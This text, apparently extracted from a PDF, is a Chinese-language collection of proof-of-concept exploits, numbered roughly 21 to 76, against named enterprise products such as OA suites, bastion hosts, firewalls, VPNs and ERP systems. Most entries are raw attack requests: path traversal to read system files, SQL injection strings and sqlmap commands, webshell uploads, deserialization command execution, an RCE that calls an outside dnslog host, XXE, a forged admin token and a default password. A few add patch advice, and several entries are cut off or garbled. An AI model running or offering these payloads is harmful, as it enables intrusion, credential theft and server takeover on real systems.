    3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15
    4 Content-Length: 134
    5 Accept-Encoding: gzip, deflate
    6 Connection: close
    7
    8 <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY
21. 某盟 SAS堡垒机 local_user.php 任意⽤⼾登录漏洞 POC
    1 GET /api/virtual/home/status?
    cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www
    /local_user.php&method=login&user_account=admin HTTP/1.1
    2 Host: 1.1.1.1
    3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) 
    AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
    4 Accept-Encoding: gzip, deflate
    5 Connection: close
22. 某盟 SAS堡垒机 GetFile 任意⽂件读取漏洞 POC
    GET /api/virtual/home/status?
    cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method
    =login&user_account=admin HTTP/1.1
    Host: 1.1.1.1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like
    Gecko) Version/12.0.3 Safari/605.1.15
    Content-Type: application/x-www-form-urlencoded
    Accept-Encoding: gzip, deflate
    Connection: close
23. 某盟 SAS堡垒机 Exec 远程命令执⾏漏洞 POC1 GET /webconf/Exec/index?cmd=wget%20xxx.xxx.xxx HTTP/1.1
    2 Host: 1.1.1.1
    3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) 
    AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
    4 Content-Type: application/x-www-form-urlencoded
    5 Accept-Encoding: gzip, deflate
    6 Connection: close
24. 某友 移动管理系 统 uploadApk.do 任意⽂件上传漏洞
    1 POST /maportal/appmanager/uploadApk.do?pk_obj=0001A1100000000H66QB HTTP/1.1 
    2 Host: 127.0.0.1:8080 
    3 Content-Length: 198 
    4 Cache-Control: max-age=0 
    5 Upgrade-Insecure-Requests: 1 
    6 Content-Type: multipart/form-data; boundary=----
    WebKitFormBoundaryvLTG6zlX0gZ8LzO3 
    7 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 
    (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 
    8 Accept: 
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima
    ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 
    9 Accept-Encoding: gzip, deflate 
    10 Accept-Language: zh-CN,zh;q=0.9 
    11 Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server 
    12 Connection: close 
    13
    14 ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3 
    15 Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"
    16 Content-Type: application/msword 
    17
    18 hello 
    19 ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3-- 
25. 启明天钥安全⽹关前台sql注⼊1 POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
    2 Host: ****
    3 Connection: close
    4 Cache-Control: max-age=0
    5 sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"
    6 sec-ch-ua-mobile: ?0
    7 Upgrade-Insecure-Requests: 1
    8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 
    (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
    9 Accept: 
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima
    ge/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
    10 Sec-Fetch-Site: none
    11 Sec-Fetch-Mode: navigate
    12 Sec-Fetch-User: ?1
    13 Sec-Fetch-Dest: document
    14 Accept-Language: zh-CN,zh;q=0.9
    15 Cookie: ****
    16 Content-Type: application/x-www-form-urlencoded
    17 Content-Length: 39
    18 checkname=123&tagid=123
    19
    20
    1 sqlmap -u "https://****/ops/index.php?c=Reportguide&a=checkrn" --data 
    "checkname=123&tagid=123" -v3 --skip-waf --random-agent
26. ⽤友M1server反序列化命令执⾏漏洞
    漏洞描述：
    M1移动协同是针对管理者、⾼端商务⼈⼠、⻓期在外⾛访客⼾的业务⼈员以及⽇常外出的⾏业者⽽打
    造的协同应⽤。该应⽤平台存在反序列化漏洞，攻击者构造恶意包可以执⾏任意命令获取服务器权限
    POC待补充
27. 启明星⾠-4A 统⼀安全管控平台 getMater 信息泄漏
    漏洞描述：启明星⾠集团4A统⼀安全管控平台实现IT资源集中管理,为企业提供集中的账号、认证、授权、审计管
    理技术⽀撑及配套流程,提升系统安全性和可管理能⼒。可获取相关⼈员敏感信息。
    GET /accountApi/getMaster.do
    poc:
    relative: req0
    session: false
    requests:

- method: GET
timeout: 10
path: /accountApi/getMaster.do
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/65.0.881.36 Safari/537.36
follow_redirects: true
matches: (code.eq("200") && body.contains("\"state\":true"))
修复建议：
限制⽂件访问
33. 锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露
漏洞描述：锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露漏洞
https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E9%94%90%E6%8
D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BAWEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7
%BB%9FEXCU_SHELL
GET /EXCU_SHELL HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/61.0.2852.74 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: /
Connection: close
Cmdnum: '1'
Command1: show running-config
Confirm1: n
34. 科荣 AIO 管理系统存在⽂件读取漏洞
漏洞描述：
科荣AIO企业⼀体化管理解决⽅案,通过ERP（进销存财务）、OA（办公⾃动化）、CRM（客⼾关系管
理）、UDP（⾃定义平台），集电⼦商务平台、⽀付平台、ERP平台、微信平台、移动APP等解决了众
多企业客⼾在管理过程中跨部⻔、多功能、需求多变等通⽤及个性化的问题。科荣 AIO 管理系统存在
⽂件读取漏洞，攻击者可以读取敏感⽂件。
1 POST /UtilServlet 
2 HTTP/1.1
3 Host: 
4 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML
5 Content-Length: 52
6 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/
7 Accept-Encoding: gzip, deflate
8 Accept-Language: zh-CN,zh;q=0.9
9 Cache-Control: no-cache
10 Connection: close
11 Content-Type: application/x-www-form-urlencoded
12 Pragma: no-cache
13 Upgrade-Insecure-Requests: 1
14
15 operation=readErrorExcel&fileName=C:\windows/win.ini
35. ⻜企互联 FE 业务协作平台 magePath 参数⽂件读取漏洞
漏洞描述：
FE 办公协作平台是实现应⽤开发、运⾏、管理、维护的信息管理平台。⻜企互联 FE 业务协作平台存
在⽂件读取漏洞，攻击者可通过该漏洞读取系统重要⽂件获取⼤量敏感信息。
漏洞影响 ：⻜企互联 FE业务协作平台
⽹络测绘：
“flyrise.stopBackspace.js”
漏洞复现 ：
登陆⻚⾯
验证POC
/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print36. ⽤友GRP-U8存在信息泄露
漏洞描述：友U8系统存可直接访问log⽇志，泄露敏感信息
批量扫描⼯
具:https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E7%94%A8%E5
%8F%8BGRP-U8
GET /logs/info.log HTTP/1.1
37. nginx配置错误导致的路径穿越⻛险
漏洞⾃查PoC如下：
https://github.com/hakaioffsec/navgix
该漏洞⾮0day，是⼀个路径穿越漏洞，可以直接读取nginx后台服务器⽂件。
有多家重点⾦融企业已中招，建议尽快进⾏⾃查。
38. 红帆OA zyy_AttFile.asmx SQL注⼊漏洞
POC：
POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1
Host: 10.250.250.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 383
Content-Type: text/xml; charset=utf-8
Soapaction: "http://tempuri.org/GetFileAtt"
Accept-Encoding: gzip, deflate
Connection: close
<?xml version="1.0" encoding="utf-8"?><soap:Envelope
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFileAtt
xmlns="http://tempuri.org/"><fileName>123</fileName></GetFileAtt> </soap:Body></so
ap:Envelope>修复⽅法
官⽅已发布安全修复版本，请升级⾄官⽹最新版本
https://www.ioffice.cn/
39. Coremail 邮件系统未授权访问获取管理员账密
POC：
/coremail/common/assets/:/:/:/:/:/:/s?
biz=Mzl3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa7262
6688chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688b
f6adaed61&scene=2
40. Milesight VPN server.js 任意⽂件读取漏洞
POC:
GET /../etc/passwd HTTP/1.1
Host:
Accept: /
Content-Type: application/x-www-form-urlencoded
41. PigCMS action_flashUpload 任意⽂件上传漏洞
POC:
POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload
HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----aaa
------aaa
Content-Disposition: form-data; name="filePath"; filename="test.php"Content-Type: video/x-flv
<?php phpinfo();?>
------aaa
/cms/upload/images/2023/08/11/1691722887xXbx.php42. 绿盟 NF 下⼀代防⽕墙 任意⽂件上传漏洞
POC:
POST /api/v1/device/bugsInfo HTTP/1.1
Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef
Host:
--4803b59d015026999b45993b1245f0ef
Content-Disposition: form-data; name="file"; filename="compose.php"
<?php eval($_POST['cmd']);?>
--4803b59d015026999b45993b1245f0ef--
POST /mail/include/header_main.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71
Host:
cmd=phpinfo();
43. ⾦盘图书馆微信管理后台 getsysteminfo 未授权访问漏洞
POC:/admin/weichatcfg/getsysteminfo
漏洞描述：北京⾦盘鹏图软件技术有限公司的⾦盘图书馆微信管理后台 getsysteminfo 存在未授权访
问漏洞
漏洞危害:获取管理员账号密码等敏感数据，导致攻击者能以管理员⾝份进⼊系统窃取敏感信息和危险
操作
修复⽅法:
官⽅已发布安全修复版本，请升级⾄官⽹最新版本
http://goldlib.com.cn/
44. Panel loadfile 后台⽂件读取漏洞
POC:
POST /api/v1/file/loadfile
{"paht":"/etc/passwd"}
45. ⽹御 ACM 上⽹⾏为管理系统bottomframe.cgi SQL 注⼊漏洞
POC:
/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23
漏洞复现
登录⻚⾯46. ⼴联达 Linkworks GetIMDictionarySQL 注⼊漏洞
POC:
POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
47. ⽤友⽂件服务器认证绕过
资产搜索：
app="⽤友-NC-Cloud" 或者是app="⽤友-NC-Cloud" && server=="Apache-Coyote/1.1"
POST数据包修改返回包 false改成ture就可以绕过登陆
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Date: Thu, 10 Aug 2023 20:38:25 GMT
Connection: close
Content-Length: 17{"login":"false"}
48. 华天动⼒oa SQL注⼊
访问
http://xxxx//report/reportJsp/showReport.jsp?raq=%2FJourTemp2.raq&reportParamsId=100xxx
然后抓包
POST /report/reportServlet?action=8 HTTP/1.1
Host: xxxx
Content-Length: 145
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://xxx/
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/86.0.4240.183 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;
q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://xxxx/report/reportJsp/showReport.jsp?
raq=%2FJourTemp2.raq&reportParamsId=100xxx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D207AE96056400942620F09D34B8CDF3
Connection: close
year=*&userName=*&startDate=*&endDate=*&dutyRule=*&resultPage=%2FreportJsp%2FshowR
epo48、49漏洞来源于：https://mp.weixin.qq.com/s/hUig93-cSFtbioQpPSNZig
49. 泛微 Weaver E-Office9 前台⽂件包含
http://URL/E-mobile/App/Init.php?
weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachm
ent/xxx.xls
50. 帆软报表系统漏洞威胁
情况说明：帆软报表系统（V10、V11及更早期版本）存在反序列化漏洞绕过、反序列化命令执⾏等⾼
危漏洞，攻击者可利⽤上述漏洞获取系统权限。鉴于该漏洞影响范围较⼤，潜在危害程度极⾼，建议
引起⾼度重视，通过官⽅发布的链接下载补丁，进⾏升级，消除安全隐患，提⾼安全防范能⼒。
漏洞详细信息: https://help.fanruan.com/finereport/doc-view-4833.html
补丁下载链接: http: //s.fanruan.com/3u6eo51. 蓝凌EKP远程代码执⾏漏洞
受影响版本：
蓝凌EKP V16 (最新版)受影响存在远程代码执⾏漏洞；V15暂⽆环境验证，可能受影响。
修复⽅案：
使⽤⽹络ACL限制该OA的访问来源，加强监测，重点拦截GET请求中带有../等⽬录穿越特征的URL。
通过⽂件上传-->解压-->获取webshell，前台漏洞
漏洞路径：1 /api///sys/ui/sys_ui_extend/sysUiExtend.do
1 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
2 Host: xxx
3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (
4 Accept: /
5 Connection: Keep-Alive
6 Content-Length: 42
7 Content-Type: application/x-www-form-urlencoded
8 var={"body":{"file":"file:///etc/passwd"}}
52. Smartx超融合远程命令执⾏漏洞
SmartX超融合系统是构建超融合平台的核⼼软件，能够基于不同虚拟化平台和软硬件的交付⽅式实现
超融合架构。Smartx超融合系统存在远程命令执⾏漏洞，攻击者可利⽤该漏洞执⾏任意命令，控制服
务器。
受影响版本：Smartx超融合version <= 5.0.5受影响存在漏洞；最新版暂⽆环境验证，可能受影响。
修复⽅案：使⽤⽹络ACL限制该产品的访问来源，加强监测，重点拦截GET请求中带有操作系统命令注
⼊特征的URL；
临时修复⽅案：
重点拦截访问 /api/v2/deployment/can_ping的可疑ip
53. Nacos-Sync未授权漏洞
https://xxx.xxx.xxx/#/serviceSync
54. 360 新天擎终端安全管理系统信息泄露漏洞
http://ip:port/runtime/admin_log_conf.cache
55. 锐捷 NBR 路由器 fileupload.php 任意⽂件上传漏洞POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
Host:
Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name="file"; filename="111.php"
Content-Type: image/jpeg
<?php phpinfo();?>
56. Openfire⾝份认证绕过漏洞(CVE-2023-32315)
GET /user-create.jsp?
csrf=Sio3WOA89y2L9Rl&username=user1&name=&email=&password=Qwer1234&passwordConf
irm=Qwer1234&isadmin=on&create=............ HTTP/1.1
57. ⼤华智慧园区综合管理平台 user_getUserInfoByUserName.action
任意密码读取漏洞
GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)58. 泛微 ShowDocsImagesql注⼊漏洞
GET
/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=* HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko)
Accept-Encoding: gzip, deflate
Connection: close
59. 宏景 HCM codesettree SQL 注⼊漏洞
GET
/servlet/codesettree?
flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20al
l~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d HTTP/1.1Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko)
Accept-Encoding: gzip, deflate
Connection: close
60. ⽤友时空 KSOATaskRequestServlet sql注⼊漏洞
/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1*&password=1,61. ⽤友时空 KSOA servletimagefield ⽂件 sKeyvalue 参数SQL 注⼊
1 GET
2 /servlet/imagefield?
key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+
union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))-
3 -+ HTTP/1.1
4 Host: 127.0.0.1
5 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) 
AppleWebKit/605.1.15 (KHTML,
6 like Gecko) 
7 Accept-Encoding: gzip, deflate
8 Connection:
62. ⽤友畅捷通 T注⼊1 sqlmap -u http://xx.xx.xx.xx/WebSer~1/create_site.php?site_id=1 --is-dba
63. 宏景OA⽂件上传
1 POST 
/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.
jsp HTTP/1.1
2 Host: xx.xx.xx.xx
3 Cookie: JSESSIONID=C92F3ED039AAF958516349D0ADEE426E
4 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 
Firefox/111.0
5 Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*
;q=0.8
6 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
7 Accept-Encoding: gzip, deflate
8 Connection: close
9 Content-Length: 417
10
11 DBSTEP V3.0 351 0 666 DBSTEP=REJTVEVQ
12 OPTION=U0FWRUZJTEU=
13 currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
14 FILETYPE=Li5cMW5kZXguanNw
15 RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
16 originalFileId=wV66
17 originalCreateDate=wUghPB3szB3Xwg66
18 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dE
g6
19 needReadFile=yRWZdAS6
20 originalCreateDate=wLSGP4oEzLKAz4=iz=66
21
22 1
shell:http://xx.xx.xx.xx/1ndex.jsp
64. ⾦和OA 未授权
1. 漏洞链接
http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=12. 复现步骤
http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?
id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1
65. Kuboard默认⼝令
漏洞描述：
Kuboard，是⼀款免费的 Kubernetes 图形化管理⼯具，Kuboard ⼒图帮助⽤⼾快速在 Kubernetes 上
落地微服务。Kuboard存在默认⼝令可以通过默认⼝令登录Kuboard，管理Kubernetes。
admin/kuboard123
66. QAX-Vpn存在x遍历及任意账号密码修改漏洞
1 https://x.xxx.xxx.cn/admin/group/xgroupphp?id=1 
2 https://x.xxx.xxx.cn/admin/group/xgroupphp?id=3 cookie: admin id=1; gw admin tic
67. 有⽤畅捷通T+GetStoreWarehouseByStore RCE漏洞
1 POST
2 /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?
method=GetstoreWarehouseByStore HTTP/1.1 Host: User-Agent:
3 Mozilla/5.0 (X11;Linuxx86 64)AppleWebKit/537.36(KHTML， like
4 Gecko)Chrome/34.0.1847.137 Safari 4E423F Connection: close
5 Content-Length:668 X-Ajaxpro-Method:GetstoreWarehouseByStore Accept￾Encoding:gzip { "storeID":{
6 "type":"system.Windows.Data.objectDataProvider,
7 PresentationFramework,Version=4.0.0.0,Culture=neutral,
8 PublicKeyToken=31bf3856ad364e35"， "MethodName":"start" 
9 "objectInstance":{ " type":"system.Diagnostics.Process, 
10 System,Version=4.0.0.0，Culture=neutral,
11 PublicKeyToken=b77a5c561934e089" "startInfo":{ 
12 " type":"system.Diagnostics.ProcessstartInfo, system,
13 Version=4.0.0.0,Culture=neutral,
14 PublicKeyToken=b77a5c561934e089" "FileName":"cmd", 
15 "Arguments":"/cwhoami>
16 C:/Progra~2/Chanjet/TPlusStd/Website/2RUsL6jgx9sGX4GItBcVfxarBM.txt" } 
 } } }68. 契约锁电⼦签章系统 RCE
Qiyuesuo是⼀款数字化可信基础服务平台，为组织提供“数字⾝份、电⼦签章、印章管控以及数据存
证服务”于⼀体的数字化可信基础解决⽅案。2023年8⽉互联⽹上披露其存在前台代码执⾏漏洞，攻击
者可构造恶意请求绕过相关认证调⽤后台功能造成远程代码执⾏，控制服务器。
受影响版本：version <=4.3
处置建议:该漏洞最新版本已经修复（当前已安装版本可通过/version/info查看）。如⽆法升级⾄安全
版本，可使⽤使⽤⽹络ACL限制访问来源，加强监测。
1 POST /callback/%2E%2E;/code/upload HTTP/1.1
2 Host: ip:port
3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
4 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
ebp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
5 Content-Type:multipart/form-data;
6
7 boundary=----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
8 ----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
9 Content-Disposition: form-data; name="type";
10
11 TIMETASK
12 ----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
13 Content-Disposition: form-data; name="file"; filename="qys.jpg"
14
15 ⻢⼉
16
17 ----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
69. 任我⾏ CRM SmsDataList SQL注⼊漏洞
1 POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
2 Host:
3 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like 
4 Accept-Encoding: gzip, deflate
5 Accept: */*
6 Connection: close
7 Content-Type: application/x-www-form-urlencoded
8 Content-Length: 170
910 Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=00000000*
70. 深信服数据中⼼管理系统sangforindex XML 实体注⼊漏洞
1 GET /src/sangforindex HTTP/1.1
2 Host: ip:port
3 Upgrade-Insecure-Requests: 1
4 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, likeGecko)
5 Accept:
6 text/xml,application/xml,application/xml;q=0.9,image/avif,image/webp,image/apng
,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
7 Content-Type: text/xml
8 Accept-Encoding: gzip, deflate, br
9 Accept-Language: zh-CN,zh;q=0.9
10 Connection: Keep-alive
11 Content-Length: 135
12 <?xml version="1.0" encoding="utf-8" ?><!DOCTYPE root [
13 <!ENTITY rootas SYSTEM "http://dnslog">
14 ]>
15 <xxx>
16 &rootas;
17 </xxx>
71. 明源云 ERP ApiUpdate.ashx ⽂件上传漏洞
1 POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1Host: target.com
2 Accept-Encoding: gzip
3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 
10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
4 Content-Length: 856
5
6 {{unquote("PK\x03\x04\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00
\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00../../../fdccloud/_/check.aspx$\xcc\xcb
\x0a\xc20\x14\x04\xd0_\x09\x91B\xbb\x09\x0a\xddH\xab\x29\x8aP\xf0QZ\xc4\xf5m\x1
8j!ib\x1e\x82\x7fo\xc4\xdd0g\x98:\xdb\xb1\x96F\xb03\xcdcLa\xc3\x0f\x0b\xce\xb2m
\x9d\xa0\xd1\xd6\xb8\xc0\xae\xa4\xe1-\xc9d\xfd\xc7\x07h\xd1\xdc\xfe\x13\xd6%0\xb3\x87x\xb8\x28\xe7R\x96\xcbr5\xacyQ\
x9d&\x05q\x84B\xea\x7b\xb87\x9c\xb8\x90m\x28<\xf3\x0e\xaf\x08\x1f\xc4\xdd\x28\x
b1\x1f\xbcQ1\xe0\x07EQ\xa5\xdb/\x00\x00\x00\xff\xff\x03\x00PK\x01\x02\x14\x03\x
14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x0
0\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00../../
../fdccloud/_/check.aspxPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00L\x00\x00\x00
\xc8\x00\x00\x00\x00\x00")}}
72. 泛微 HrmCareerApplyPerView S Q L 注⼊漏洞
1 GET
2 /pweb/careerapply/HrmCareerApplyPerView.jsp?
id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(db_name()),db_name(1),5,6,7
HTTP/1.1
3 Host: 127.0.0.1:7443
4 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)
AppleWebKit/605.1.15 (KHTML,like Gecko)
5 Accept-Encoding: gzip, deflate
6 Connection: close
73. Metabase validate 远程命令执⾏漏洞（CVE-2023-38646）
漏洞描述
Metabase是⼀个开源的数据分析和可视化⼯具，它可以帮助⽤⼾轻松连接到各种数据源，包括数据
库、云服务和API，然后使⽤绘图的界⾯进⾏数据查询、分析和可视化。需⾝份认证的远程攻击者利⽤
该漏洞可以在服务器上以运⾏元数据库服务器的权限执⾏任意命令
漏洞影响
元数据库
⽹络测绘
应⽤程序=“元数据库”
漏洞复现
登录⻚⾯POC
/api/session/properties
1 POST /api/setup/validate HTTP/1.1
2 Host:
3 Content-Type: application/json
4 Content-Length: 812
5
6 {7 "token": "e56e2c0f-71bf-4e15-9879-d964f319be69",
8 "details":
9 {
10 "is_on_demand": false,
11 "is_full_sync": false,
12 "is_sample": false,
13 "cache_ttl": null,
14 "refingerprint": false,
15 "auto_run_queries": true,
16 "schedules":
17 {},
18 "details":
19 {
20 "db": "zip:/app/metabase.jar!/sample￾database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER 
pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS 
$$//javascript\njava.lang.Runtime.getRuntime().exec('curl 
ecw14d.dnslog.cn')\n$$--=x",
21 "advanced-options": false,
22 "ssl": true
23 },
24 "name": "an-sec-research-team",
25 "engine": "h2"
26 }
27 }
74. KubePi JwtSigKey 登陆绕过漏洞（CVE-2023-22463）
漏洞描述
KubePi 中存在 JWT 硬编码，攻击者通过硬编码可以获取服务器后台管理权限，添加任意⽤⼾漏洞影响
库⻉派
⽹络测绘
“库⻉⽪”
漏洞复现
登陆⻚⾯
1 POST /kubepi/api/v1/users HTTP/1.1
2 Host: {{Hostname}}
3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
4 accept: application/json
5 Accept-Encoding: gzip, deflate
6 Authorization: Bearer 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbW
luaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ
04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsi
ZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsO
Z4BB4GoSkfLO2NvbKCEQjld8
7
8 {
9 "authenticate": {
10 "password": "{{randstr}}"
11 },
12 "email": "{{randstr}}@qq.com",13 "isAdmin": true,
14 "mfa": {
15 "enable": false
16 },
17 "name": "{{randstr}}",
18 "nickName": "{{randstr}}",
19 "roles": [
20 "Supper User"
21 ]
22 }
纯⽂本
75. 禅道 16.5 router.class.php SQL注⼊漏洞
POST /user-login.html
account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user
%28%29%29%2C0x7e%29%29%29%23
76. ⾦⼭EDR RCE漏洞
开启⽇志 /Console/inter/handler/change_white_list_cmd.php id参数
1 POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1
2 Host: 192.168.24.3:6868
3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) 
Gecko/20100101
4 Firefox/114.0
5 Accept: */*6 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
7 Accept-Encoding: gzip, deflate
8 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
9 X-Requested-With: XMLHttpRequest
10 Content-Length: 131
11 Origin: http://192.168.24.3:6868
12 Connection: close
